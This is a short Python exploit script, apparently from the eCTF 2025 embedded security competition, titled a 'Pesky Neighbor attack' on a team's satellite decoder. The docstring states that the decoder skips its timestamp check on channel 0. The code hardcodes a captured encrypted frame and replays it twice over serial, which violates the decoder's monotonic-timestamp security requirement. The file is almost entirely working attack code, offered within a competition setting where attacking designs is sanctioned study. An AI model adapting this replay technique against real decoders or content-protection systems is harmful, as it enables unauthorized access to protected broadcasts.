"""Pesky Neighbor attack for RPI
@author: Xinyue
@description: RPI bypasses the timestamp check for channel 0, so by simply replaying lgmt channel 0 frame,
we can make it violate security requirement 3 (monotonically increasing timestamps)
"""
import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    lgmt_frame_channel0 = b"U/M\xa5\xd3\xbf\xean\xf3\xc7\x85\xa3\x00\x00\x00\x00\xe2w\xb4\xca\xa0\xa7\x06\x00<k.-\xdc\nv\xd3'\x98\x9b\xbc\xdc\x8d\xb1L\r\xae\xd4o\xb8\xcc\x98\xf9\x9c!\xda\x08\xe3B\x89;5\xec_\xef\xec\x9e\xeb#\xa6H\xa2j\xcf\x96\xf2\xefL$Mg\n\x1d@8'\xca\x08\xff\xd6\x0b\xab\x11\xc0iS&\x99B\xa7_\\?\xce\x8e`\xee\xe3Q"
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")